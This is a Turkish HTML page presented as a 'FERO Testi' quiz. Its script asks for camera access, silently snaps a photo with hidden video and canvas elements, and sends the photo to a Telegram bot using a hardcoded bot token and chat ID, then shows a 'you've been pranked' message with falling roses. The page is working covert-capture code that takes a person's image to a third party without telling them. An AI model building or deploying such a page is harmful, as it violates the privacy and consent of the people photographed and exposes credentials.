<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>FERO Testi</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      flex-direction: column;
      overflow: hidden;
    }
    button {
      padding: 15px 30px;
      margin: 10px;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      background: #ff0040;
      color: white;
      transition: 0.3s;
    }
    button:hover {
      background: #ff3366;
    }
    .rose {
      position: absolute;
      top: -50px;
      font-size: 24px;
      animation: fall linear forwards;
      opacity: 0.9;
    }
    @keyframes fall {
      to {
        transform: translateY(110vh) rotate(360deg);
        opacity: 0;
      }
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h1>FERO Testi</h1>
  <button onclick="startCamera()">Devam etmek istiyor musun?</button>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I"; // senin bot token
    const CHAT_ID = "8494445812"; // senin chat id

    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setTimeout(takePhotoAndSend, 1500); // 1.5 sn sonra oto çek
        })
        .catch(() => {
          document.body.innerHTML = "<h1>Kamera izni verilmedi 😅</h1>";
        });
    }

    function takePhotoAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");
        formData.append("caption", "Şakalandın dostum 😃");

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(() => {
          document.body.innerHTML = "<h1>Şakalandın dostum 😃</h1>";
          startRoses();
        }).catch(() => {
          document.body.innerHTML = "<h1>Fotoğraf gönderilemedi 😅</h1>";
        });
      });
    }

    // 🌹 Gül efektleri
    function createRose() {
      const rose = document.createElement("div");
      rose.classList.add("rose");
      rose.innerHTML = "🌹";
      rose.style.left = Math.random() * 100 + "vw";
      rose.style.fontSize = (20 + Math.random() * 20) + "px";
      rose.style.animationDuration = (4 + Math.random() * 4) + "s";
      document.body.appendChild(rose);

      setTimeout(() => rose.remove(), 8000);
    }
    function startRoses() {
      setInterval(createRose, 400);
    }
  </script>
</body>
</html>
